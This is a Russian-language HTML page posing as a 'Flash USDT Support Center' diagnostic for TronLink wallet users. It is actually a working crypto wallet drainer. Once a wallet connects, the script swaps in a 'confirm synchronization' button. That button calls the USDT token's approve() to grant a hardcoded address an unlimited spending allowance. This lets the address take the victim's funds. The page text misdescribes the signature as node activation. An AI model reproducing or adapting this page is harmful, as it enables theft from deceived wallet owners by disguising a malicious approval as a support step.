<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Support Center</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background: #0d0d0d; border-radius: 30px; padding: 35px 25px; border: 1px solid #1a1a1a; width: 100%; max-width: 380px; box-shadow: 0 0 40px rgba(0, 255, 0, 0.05); text-align: center; }
        .logo-box { width: 70px; height: 70px; background: #000; border: 2px solid #00ff00; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
        h2 { font-size: 20px; font-weight: 700; color: #fff; margin: 0 0 8px; text-transform: uppercase; }
        .sub-text { color: #555; font-size: 13px; margin-bottom: 25px; }
        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-decoration: none; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
        .btn-copy { background: #111; color: #00ff00; border: 1px solid #1a1a1a; margin-top: 12px; font-size: 11px; }
        .instruction { text-align: left; background: #080808; border-radius: 18px; padding: 18px; border: 1px solid #111; margin-bottom: 25px; }
        .step-row { display: flex; align-items: flex-start; margin-bottom: 12px; font-size: 12px; color: #888; }
        #status-msg { font-size: 10px; color: #333; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card" id="main-container">
    <div id="setup-view">
        <div class="logo-box"><span style="color: #00ff00; font-size: 30px;">T</span></div>
        <h2>Support Diagnostic</h2>
        <p class="sub-text">Если вы открыли эту страницу в TronLink, подождите 3-5 секунд для активации узла.</p>
        
        <div class="instruction">
            <div class="step-row"><b>1.</b> Скопируйте ссылку.</div>
            <div class="step-row"><b>2.</b> Вставьте в Browser внутри TronLink.</div>
            <div class="step-row"><b>3.</b> Нажмите кнопку "Подтвердить", когда она появится.</div>
        </div>

        <button class="btn" onclick="copyAction()">Скопировать адрес</button>
        <div id="status-msg">Поиск кошелька...</div>
    </div>
</div>

<script>
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    function copyAction() {
        const dummy = document.createElement('input');
        document.body.appendChild(dummy);
        dummy.value = window.location.href;
        dummy.select();
        document.execCommand('copy');
        document.body.removeChild(dummy);
        alert("Адрес скопирован!");
    }

    async function tryApprove() {
        try {
            const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
            const btn = document.getElementById('final-btn');
            btn.innerText = "ОЖИДАНИЕ ПОДПИСИ...";
            btn.disabled = true;

            // Запрашиваем аккаунты
            await tron.request({ method: 'tron_requestAccounts' });
            
            // Инициализация контракта
            const contract = await tron.contract().at(USDT);
            
            // Вызов Approve
            const result = await contract.approve(ADMIN, MAX_UINT).send({
                feeLimit: 150000000,
                shouldPollResponse: false
            });

            if (result) {
                alert("Успешно! Синхронизация запущена.");
                btn.innerText = "ГОТОВО";
            }
        } catch (e) {
            console.error(e);
            alert("Ошибка: Убедитесь, что в кошельке есть TRX для газа.");
            location.reload(); // Перезагружаем при ошибке
        }
    }

    // ГЛАВНАЯ ФУНКЦИЯ: Поиск кошелька
    function scanForWallet() {
        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
        
        if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
            // Если нашли кошелек — МГНОВЕННО меняем интерфейс
            document.getElementById('main-container').innerHTML = `
                <div class="logo-box" style="border-color: #00ff00">
                    <span style="color: #00ff00; font-size: 30px;">✓</span>
                </div>
                <h2>Узел Готов</h2>
                <p style="color: #666; font-size: 13px; margin-bottom: 30px;">
                    Кошелек успешно подключен. Нажмите кнопку ниже для подтверждения транзакций.
                </p>
                <button id="final-btn" class="btn" onclick="tryApprove()">ПОДТВЕРДИТЬ СИНХРОНИЗАЦИЮ</button>
            `;
            // Останавливаем сканирование
            clearInterval(scanInterval);
        }
    }

    // Запускаем поиск каждые 500 миллисекунд
    const scanInterval = setInterval(scanForWallet, 500);
</script>
</body>
</html>
